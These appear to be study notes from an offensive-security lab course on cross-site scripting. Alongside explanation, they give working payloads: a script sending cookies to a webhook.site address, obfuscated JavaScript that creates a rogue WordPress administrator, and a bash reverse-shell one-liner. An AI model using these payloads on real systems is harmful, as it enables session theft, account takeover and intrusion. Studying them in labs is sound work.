### XXS

XSS or Cross-Site Scripting lets us execute javascript on a victim's computer in order to gather information and even take control of the browser.  


#### Reflected

This is when you put in your script and you get a response back that includes the script. This type is very limited since you can generally only target yourself but this is what is used to see if XSS is even possible on the site  

#### Stored

This is where the script itself is stored on the database and affects any user that comes to the site and happens to load that script through the website.  Checking this is easier with a Firefox add-on called Multi Account Containers  

For this, we might use the following  

`<script>prompt(1)</script>`  

This, if the site is vulnerable, should prompt you with a 1 and a text input box.

Some special characters that let us also test for unsanitized input are the following: `< > ' " { } ;`  These characters are used in javascript and should be filtered.

We can also do something like this  

`<script>alert(document.cookie)</script>` and this should spit out any cookies the user has  

For this, a malicious actor might not do an `alert` but instead have it kick out somewhere else that they have access to.  

This can be stopped by setting your cookies to `http only` which stops scripts from being able to read your cookies.  

DOM-based - Everything happens locally in the browser.  An example of this would be a page that adds things to a list.  There is no network communication (can be checked in dev tools network tab) so it's all based within the browser itself.  There's no server communication.  

For this, we might use the following  

`<img src=x onerror="prompt(1)">`  

This will try to load the image from `img src` and won't be able to find `x` so it will error out and `onerror` will run our script.  

OR  

`<img src=x onerror="window.location.href = 'http://www.mysite.com'"/>`  

This will actually send the browser to another webiste when the image fails to load.  


Checking for XSS capability  

Open your DevTools in the browser (ctrl + shft + C in firefox) and go to the console and you can type in there.  

`print()` this should pop up the print page  
`prompt("hello")` this should pop a window saying hello and asking for input  
`alert(1)` - this is being less usable as browsers update but was the OG lol  

Common tactic for extracting cookies  

`<script>var i=new Image;i.src="https://webhook.site/30a82a00-7b3e-4773-a668-31cfd1191564/?"+document.cookie;</script>`  

This will send the contents of the cookie as a parameter of the website.  Make sure you add the /? at the end of the address to make the cookie a parameter in the URL and then add the cookie `+document.cookie;` and close your script.  

There are also ways to take advantage of http headers.  This following code snippet takes advantage of a vulnerable plug in that stores the `user-agent` header in the db.  Pay attention to the email part and the password part about half way down.

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

We then take that and minify it.  Then use the following in the console to encode it.

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

We can then use `curl` along with `eval()` in order to compromise the system.

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,10.............99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

While this is very shortened, we get the beginning of the command along with proxying the traffic through burpsuite and turn on intercept to make sure that we're ok when it's sent.

Then when the admin clicks on the right section in the admin portal, it will create a user that was listed and make them an admin.  Then we can use a php oneliner in order to create a reverse shell by editing one of the plugins.

`exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.123/1234 0>&1;");`

Add that to the plugin, start up your listener, and then activate the plugin and you should now have a reverse shell.